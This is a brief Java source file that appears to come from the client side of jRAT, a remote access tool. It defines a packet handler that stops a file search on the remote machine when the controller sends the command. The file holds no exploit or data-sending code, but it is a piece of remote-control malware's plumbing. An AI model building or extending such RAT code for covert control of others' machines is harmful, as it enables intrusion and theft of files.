package jrat.client.packets.incoming;

import jrat.client.Connection;
import jrat.client.FileSearch;

public class Packet54StopSearch extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		FileSearch.stopSearch();
	}

}
